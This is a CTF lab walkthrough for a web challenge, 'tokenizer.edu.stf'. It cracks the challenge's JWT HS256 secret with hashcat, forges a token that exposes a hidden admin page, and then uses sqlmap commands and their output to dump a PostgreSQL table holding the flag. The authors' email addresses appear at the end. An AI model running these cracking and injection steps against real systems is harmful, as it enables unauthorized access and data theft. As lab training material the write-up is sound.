web-5 tokenizer.edu.stf

Hint для тех у кого впн и сама страница на разных машинках

 
#### 1 hint

Studying the JWT mechanism and its vulnerabilities:
 
Get a test JWT and study its contents carefully

Study the JWT generation algorithm and check if it is possible to select a secret key for generating new JWTs

#### 2 hint

Generating and using your own JWT:

Generate a new JWT using the found secret key. Pay attention to the secret field.

Find the hidden PHP file using check.php
  

#### 3 hint

SQL injection operation and code execution:
After finding supersecretadminloginyoullneverguess.php try to find the login details.

Check the user information search box for injections.

Access the web server through a vulnerability in the PostgreSQL database.


#### Scout nmap

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:85:4a:9f:e9:70:ed:e7:80:ca:0d:3a:f4:6b:8d:ff (RSA)
|   256 fa:68:91:c4:1f:dc:be:f2:5d:22:ba:be:25:90:c2:bb (ECDSA)
|_  256 2a:16:b9:fd:68:2a:48:c2:b6:2b:34:d3:5d:1c:89:1c (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Test auth Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
1720/tcp open  h323q931?
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-02-08T11:04:29
|_Not valid after:  2031-02-06T11:04:29
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2120
|_    RProcessStartupPacket
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.94SVN%I=7%D=8/24%Time=66C9E886%P=x86_64-pc-linux-gnu%r
SF:(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fron
SF:tend\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x
SF:203\.0\0Fpostmaster\.c\0L2120\0RProcessStartupPacket\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
тут кроме базы данных ничего не видим 
####  preparing for the attack 

When you visit the site, we see the following screen
And have some request :
GET /token.php?Get+Test+token=Submit+Query
![[Pasted image 20240911180044.png]]
answer from server 

![[Pasted image 20240911180100.png]]
Token : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmFtZXMiLCJkaXIiOiJzYW1wbGVzIiwia2V5IjoicXdlcnR5IiwidGltZXN0YW1wIjoxNzI0NTA3NTgwfQ.FGGagK9YlY2EHX52Sf_leBZ1HsneN9NREYcOGXZY2iw

Next, I would like to suggest that you familiarize yourselves with these two websites: https://jwt.io/ and https://edgecenter.ru/dev-tools/decode-jwt. We use them

![[Pasted image 20240911134137.png]]
Having studied Figure 1, we see that HS256 is already known to be a weak encryption algorithm. 
Let's move on.
As we know, one standard way to discover something on a website is through directory brute-forcing.
In this case, it gives us the page [http://10.124.1.239/check.php](http://10.124.1.239/check.php). The response is as follows: `Get param 'jwt' is not set`. This hints that it needs to be specified... We specify it using **?jwt=,** and the result is a list of files
![[Pasted image 20240911181249.png]]

Думаю от нас что то хотя сделать с Jwt и отправить его сюда , как вы помните одна из payloads это параметр dir  который мы будем менять 

#### cracking  Jwt

Method 1
Pay attention to the size, loading, and use this list for hashing by brute force https://www.weakpass.com/wordlist/1802

When we use this command, we need to wait for the decompression to complete.
We can then extract the contents using the following command: 
gunzip HashesOrg.gz

StartAttack (take into account the location of the files ) {jwt.txt specify the Jwt in the file without changes }

hashcat -a 0 -m 16500 jwt.txt ~/Downloads/HashesOrg 

![[Pasted image 20240911132254.png]]
Answer: 2e025
( I'll leave it here in case someone has a weak PC. )

2 way cracking  
use following command :

hashcat -a 3 -m 16500 /home/kali/Desktop/Document/ffuz_txt/jwt.txt ?a?a?a?a?a?a?a -i --increment-min=4

(**?a?a?a?a?a?a** : This is a mask that indicates that Hashcat will iterate through all possible characters (letters, numbers, and special characters) for seven positions. The character `?a` stands for any character from the ASCII set.)


#### charge token
once again, our token 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmFtZXMiLCJkaXIiOiJzYW1wbGVzIiwia2V5IjoicXdlcnR5IiwidGltZXN0YW1wIjoxNzI2MDQxMTEzfQ.8HexxHT5cLuhRVaUpCu7N-YML0zfHkUkCWrcYMs-MPM

Next, the name of the key, we can change the data in our token
Charge:
either the full path as in the screenshot `/var/www/html`
or specify `./`
Both commands will show us the site directories where the file is located
![[Pasted image 20240911134012.png]]

Next, you need to specify our new token

Method1
be specified ?jwt= in burp 
![[Pasted image 20240911134035.png]]

Method2 use in url
`?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSmFtZXMiLCJkaXIiOiJzYW1wbGVzIiwia2V5IjoicXdlcnR5IiwidGltZXN0YW1wIjoxNzI2MDQxMTEzfQ.8HexxHT5cLuhRVaUpCu7N-YML0zfHkUkCWrcYMs-MPM`
![[Pasted image 20240911175031.png]]

We see a cool directory: Super Duper Hidden Directory.

Go to this link and see the password and login fields, (at first I thought that sql was here... But she's not here.(╯︿╰) 
Enter **admin admin** with the handles and go to the next page where we see the new fields 
We see it:

![[Pasted image 20240911182742.png]]

#### attack  sql

I did it through sqlmap, you could do it in a different way, I don't think you need to explain, just use the commands

We drop the http package from burp in the pack files and execute the commented command ()since we specify cookies in the package, therefore you do not need to specify the username and password that you entered before, if you do it differently, you will most likely need to specify them*()

```
┌──(kali㉿kali)-[~/htb]
└─$ #sqlmap -r pack --level=5 --risk=3 --dbs --batch --random-agent --threads=10 --time-sec=5 --timeout=30 --ignore-code=404
cat pack 
POST /supersecretadminloginyoullneverguess.php HTTP/1.1
Host: tokenizer.edu.stf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://tokenizer.edu.stf
DNT: 1
Connection: keep-alive
Cookie: _gcl_au=1.1.807887967.1724594292; _ga_E9PS2EVWYS=GS1.1.1724665941.2.1.1724676481.60.0.0; _ga=GA1.1.26186061.1724594292; _clck=1nao1d7%7C2%7Cfon%7C0%7C1698; _fbp=fb.1.1724594293979.186148304756426122; PHPSESSID=p80oov368a5mo6497j22dqhbuo
Upgrade-Insecure-Requests: 1

name=1&address=1&phone=1&email=1&plan=1&submit_search=Submit

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

```

attack2 looking at the table in the database
```
sqlmap -r pack --level=5 --risk=3 --tables -D public --batch --random-agent

+--------------+
| clients_data |
| secret       |
+--------------+

```

we are looking for the flag column

```
sqlmap -r pack --level=5 --risk=3 --columns -D public -T clients_data --batch --random-agent

+---------+---------+
| Column  | Type    |
+---------+---------+
| name    | varchar |
| address | text    |
| email   | varchar |
| id      | int4    |
| phone   | varchar |
| plan    | varchar |
+---------+---------+

sqlmap -r pack --level=5 --risk=3 --columns -D public -T secret --batch --random-agent

+--------+--------+
| Column | Type   |
+--------+--------+
| flag   | bpchar |
| id     | int4   |
+--------+--------+

```

Find out and look 
```
sqlmap -r pack --level=5 --risk=3 --dump -D public -T secret --batch --random-agent


+----+--------------------------------------+
| id | flag                                 |
+----+--------------------------------------+
| 1  | 32они_запрещают_делиться_флагамe58bd |
+----+--------------------------------------+


```

Автор: Archivist
vasya.kotov.8080@mail.ru
Соавтор: Nebty
alex122303q@gmail.com